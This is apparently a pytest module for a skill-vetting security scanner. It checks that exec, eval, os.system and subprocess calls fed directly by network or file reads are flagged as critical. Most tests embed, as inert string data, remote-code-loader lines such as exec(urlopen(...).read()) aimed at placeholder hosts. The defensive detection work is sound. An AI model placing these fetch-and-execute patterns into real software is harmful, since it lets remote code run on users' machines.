"""CLAWSECCHECK-B-916 — an inline source call inside an exec-sink argument is external
input, exactly like an already-bound tainted NAME.

`_call_args_tainted` (the shared helper TT5/TT4/SSRF all use) decides "does this call's
argument carry external taint" by intersecting the NAMES it finds in the argument against
a tainted-name map. A source call written directly in the argument -- no intermediate
variable -- has no tainted Name in it at all, so TT5 silently never fired:

    exec(urlopen("https://example.invalid/p").read(), {})        -> DANGEROUS_SINK/info only
    exec(open("/tmp/stage2.py").read(), {})                       -> DANGEROUS_SINK/info only
    exec(pathlib.Path("/tmp/stage2.py").read_text(), {})          -> DANGEROUS_SINK/info only

The same code with `.decode()` appended, or with the read bound to a variable first, was
already crit -- the verdict turned on spelling, not behaviour. `_call_args_tainted_for_
exec_sink` (skillast.py, used ONLY at the TT5 exec-sink site) closes this by also
recognizing an inline `_value_is_tainted_source` match; a new file-level pre-scan
(`_has_inline_exec_sink_source`) makes sure the whole TT5/TT4/SSRF pass is not skipped
outright just because no NAME anywhere in the file is externally tainted.

Stacked on CLAWSECCHECK-B-638 (`fix/b-638`): an exec proven to run exactly a file the
artifact ships stays carved out in front of this rule, whether the taint reaching it is a
NAME or now an inline source call — the fixture pair at the bottom of this file pins that
in both directions, mirroring test_b638_shipped_exec_containment.py's own pattern.

Every `exec`/`eval`/`os.system`/`subprocess(..., shell=True)` spelling below is INERT test
data handed to `analyze_python`'s read-only AST parser (see its own docstring: "Never
raises, never executes") -- this file never calls, imports or shells out to any of it,
matching every sibling test module in this directory (test_taint_extended.py,
test_b752_artifact_containment.py, ...).

Offline, read-only, stdlib only.
"""
from __future__ import annotations

from pathlib import Path

from clawseccheck.catalog import FAIL, PASS
from clawseccheck.checks import vet_skill
from clawseccheck.shippedexec import ShippedArtifact
from clawseccheck.skillast import analyze_python

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures"


def _rules(src: str, filename: str = "x.py") -> dict[str, object]:
    return {f.rule: f for f in analyze_python(src, filename)}


def _convicts(src: str, filename: str = "x.py") -> bool:
    return any(f.severity == "crit" for f in analyze_python(src, filename))


# ---------------------------------------------------------------------------
# The exact PoC from the ticket: exec()/eval() with no artifact, no variable.
# ---------------------------------------------------------------------------


def test_exec_urlopen_read_inline_convicts():
    src = (
        'from urllib.request import urlopen\n'
        'exec(urlopen("https://example.invalid/p").read(), {})\n'
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert r["TT5_CMD_INJECTION"].severity == "crit"
    assert "direct" in r["TT5_CMD_INJECTION"].reason


def test_exec_open_read_inline_convicts():
    src = 'exec(open("/tmp/stage2.py").read(), {})\n'
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_exec_pathlib_read_text_inline_convicts():
    src = 'import pathlib\nexec(pathlib.Path("/tmp/stage2.py").read_text(), {})\n'
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_eval_urlopen_read_inline_convicts():
    src = (
        'from urllib.request import urlopen\n'
        'eval(urlopen("https://example.invalid/p").read())\n'
    )
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_end_to_end_vet_skill_now_fails_critical():
    """The exact end-to-end regression the ticket measured: a skill whose only code
    execs an inline network read used to vet B13 PASS -- INSTALL for a remote code
    loader. Must now FAIL/CRITICAL."""
    f = vet_skill(FIXTURES / "bad_b916_inline_exec_source" / "skills" / "loaderskill")
    assert f.status == FAIL
    assert f.severity == "CRITICAL"
    assert any("exec" in e.lower() for e in (f.evidence or []))


# ---------------------------------------------------------------------------
# Sink coverage: the same inline-source taint reaches TT5's other sinks too
# (os.system/os.popen/subprocess.*), not just bare exec()/eval().
# ---------------------------------------------------------------------------


def test_os_system_urlopen_read_inline_convicts():
    src = (
        'import os\n'
        'from urllib.request import urlopen\n'
        'os.system(urlopen("https://example.invalid/p").read())\n'
    )
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_subprocess_run_requests_get_text_inline_convicts():
    src = (
        'import subprocess, requests\n'
        'subprocess.run(requests.get("https://example.invalid/p").text, shell=True)\n'
    )
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_compile_then_exec_of_an_inline_network_read_convicts():
    """`compile()` composing an inline source call, then exec'd -- the wrapper does not
    hide the source from the same recursive `_value_is_tainted_source` walk."""
    src = (
        'from urllib.request import urlopen\n'
        'exec(compile(urlopen("https://example.invalid/p").read(), "<string>", "exec"))\n'
    )
    assert "TT5_CMD_INJECTION" in _rules(src)


def test_decode_wrapped_inline_read_into_a_non_exec_sink_convicts():
    """The decode-wrapped variant was already crit for bare exec()/eval() via
    OBFUSCATED_EXEC, but that rule only ever looked at the exec/eval builtin name
    directly -- os.system()/subprocess.* never went through it at all, so this exact
    inline-plus-decode shape on THOSE sinks was every bit as blind as the plain-read
    case. Confirms the fix (which recurses through the decode() wrapper via
    `_value_is_tainted_source`) closes that half too."""
    src = (
        'import os\n'
        'from urllib.request import urlopen\n'
        'os.system(urlopen("https://example.invalid/p").read().decode())\n'
    )
    assert "TT5_CMD_INJECTION" in _rules(src)


# ---------------------------------------------------------------------------
# Mixed / secondary-argument taint: the same rigor the B-752 exemption already
# holds itself to for name-bound taint must hold for inline-source taint too.
# ---------------------------------------------------------------------------


def test_inline_source_in_the_namespace_argument_also_convicts():
    """Not just args[0] — an inline source anywhere in the call's arguments counts,
    matching how a tainted NAME in any argument already did."""
    src = (
        'import os\n'
        'exec("print(1)", {"x": os.getenv("ATTACKER")})\n'
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" in r
    assert "flow" in r["TT5_CMD_INJECTION"].reason


def test_listform_argv_inline_source_is_still_arg_injection_not_crit():
    """B13 FP regression class (smyx-payment), replayed with an inline source instead
    of a named variable: a tainted value in a fixed-program argv list (shell=False) is
    argument injection (info), not command injection -- the subprocess-argv downgrade
    must still apply when the taint arrives inline."""
    src = (
        'import subprocess, sys\n'
        'from urllib.request import urlopen\n'
        'def handle():\n'
        '    subprocess.run(\n'
        '        [sys.executable, "-m", "scripts.query", urlopen("https://x/y").read().decode()],\n'
        '        shell=False,\n'
        '    )\n'
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" not in r
    assert "TT5_ARG_INJECTION" in r
    assert r["TT5_ARG_INJECTION"].severity == "info"


# ---------------------------------------------------------------------------
# Benign controls that must NOT FAIL.
# ---------------------------------------------------------------------------


def test_eval_of_a_literal_is_not_convicted():
    assert not _convicts('eval("1+1")\n')
    assert "TT5_CMD_INJECTION" not in _rules('eval("1+1")\n')


def test_exec_of_a_plain_literal_string_is_not_convicted():
    assert not _convicts('exec("print(1)")\n')


def test_file_with_no_exec_sink_at_all_is_unaffected():
    """Non-vacuity for the new file-level pre-scan: a file with plenty of external
    input but no exec-sink call anywhere must stay exactly as before."""
    src = (
        'from urllib.request import urlopen\n'
        'data = urlopen("https://example.invalid/p").read()\n'
        'print(len(data))\n'
    )
    r = _rules(src)
    assert "TT5_CMD_INJECTION" not in r


def test_clean_shipped_file_exec_inline_is_still_pass_via_vet_skill():
    """CLAWSECCHECK-B-638's carve-out in front of this rule: an exec proven to run
    exactly a file the artifact ships stays clean even though the read is now taint
    for TT5's general case -- inline, exactly like the named-variable form already
    covered by test_b638_shipped_exec_containment.py."""
    f = vet_skill(
        FIXTURES / "clean_b916_shipped_version_exec_inline" / "skills" / "demo-packager"
    )
    assert f.status == PASS, (f.status, f.detail)


def test_clean_shipped_file_exec_inline_direct_analyze_python_has_no_crit():
    """The same control at the `analyze_python` level, with an explicit `ShippedArtifact`
    (the B-638 proof) -- pins that the exemption fires on the INLINE read chain itself,
    not merely on `vet_skill`'s own end-to-end wiring."""
    src = (
        'import os\n'
        'here = os.path.abspath(os.path.dirname(__file__))\n'
        'about = {}\n'
        'exec(\n'
        '    open(os.path.join(here, "demo_plugin", "__version__.py"), "r",\n'
        '         encoding="utf-8").read(),\n'
        '    about,\n'
        ')\n'
    )
    files = [
        ("setup.py", src),
        ("demo_plugin/__version__.py", '__version__ = "1.4.2"\n'),
    ]
    art = ShippedArtifact(files)
    findings = analyze_python(src, "setup.py", artifact=art)
    assert not [f for f in findings if f.severity == "crit"], findings
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)


def test_a_genuinely_external_inline_read_is_unaffected_by_the_shipped_carveout():
    """Sanity check the two fixtures actually differ in the way the tests claim: the
    SAME artifact wiring, but the exec target is a network read rather than a shipped
    file, must still convict -- the carve-out is not accidentally blanket-clearing
    every exec call once an artifact is supplied."""
    src = (
        'from urllib.request import urlopen\n'
        'exec(urlopen("https://example.invalid/p").read(), {})\n'
    )
    art = ShippedArtifact([("setup.py", src)])
    findings = analyze_python(src, "setup.py", artifact=art)
    assert any(f.rule == "TT5_CMD_INJECTION" and f.severity == "crit" for f in findings)


def test_fully_inline_setup_py_idiom_with_no_artifact_stays_exempt():
    """B-752's own idiom (`with open(...) as fh: exec(fh.read().decode())`), written
    with NO intermediate variable at all -- `exec(open(join(dirname(__file__), "v.py"),
    "rb").read().decode("utf-8"), {})` -- has no tainted NAME in it whatsoever, only
    the inline source `_call_args_tainted_for_exec_sink` (B-916) now also recognizes.
    REGRESSION PIN: the first draft of this fix convicted exactly this shape, because
    `_exec_sink_taint_is_only_artifact_relative_decode`'s name-only accounting returned
    False the instant there was no tainted name to check -- an early return that used
    to be unreachable from its one call site and became reachable, and wrong, the
    moment inline-only taint could get there at all. Same non-vacuity spread across
    relpath depths as test_b753_path_join_not_a_decode.py's own version of this pin."""
    for relpath in ("mod.py", "pkg/mod.py", "a/b/mod.py", ""):
        src = (
            "import os\n"
            'exec(open(os.path.join(os.path.dirname(__file__), "v.py"), "rb")'
            '.read().decode("utf-8"), {})\n'
        )
        assert not _convicts(src, relpath), relpath


def test_inline_decode_receiver_mixed_with_a_second_inline_source_still_convicts():
    """The inline-taint twin of test_artifact_read_mixed_with_a_second_tainted_source_
    still_convicts (test_b752_artifact_containment.py): the legitimate artifact-relative
    decode read is genuinely benign on its own, but concatenated with an UNRELATED inline
    network read in the same expression, the combined argument must still convict --
    `_has_uncovered_inline_source` exists specifically to keep this shape from riding
    through on the first read's coattails."""
    src = (
        "import os\n"
        "from urllib.request import urlopen\n"
        'exec(\n'
        '    open(os.path.join(os.path.dirname(__file__), "v.py"), "rb").read().decode("utf-8")\n'
        '    + urlopen("https://example.invalid/p").read().decode("utf-8"),\n'
        "    {},\n"
        ")\n"
    )
    assert _convicts(src, "mod.py")


def test_unshipped_local_target_stays_info_not_crit(tmp_path):
    """A path that resolves inside the artifact but is not itself shipped/analysed
    Python is a WARN-grade unknown (Golden Rule #4), never a crit -- pins that this
    still holds once the read reaching it is inline-source taint."""
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    src = (
        'import pathlib\n'
        'exec(pathlib.Path(__file__).with_name("data.bin").read_text(), {})\n'
    )
    (skill_dir / "setup.py").write_text(src, encoding="utf-8")
    art = ShippedArtifact([("setup.py", src)], root=str(skill_dir))
    findings = analyze_python(src, "setup.py", artifact=art)
    assert not [f for f in findings if f.severity == "crit"], findings
    assert any(f.rule == "UNSHIPPED_FILE_EXEC" for f in findings)


# ---------------------------------------------------------------------------
# The fixture pair -- non-vacuity for the vet_skill-level pin above.
# ---------------------------------------------------------------------------


def test_the_bad_and_clean_b916_fixtures_are_not_accidentally_identical():
    bad = (FIXTURES / "bad_b916_inline_exec_source" / "skills" / "loaderskill"
           / "loader.py").read_text(encoding="utf-8")
    clean = (FIXTURES / "clean_b916_shipped_version_exec_inline" / "skills"
              / "demo-packager" / "setup.py").read_text(encoding="utf-8")
    assert bad != clean
    assert "urlopen" in bad
    assert "urlopen" not in clean
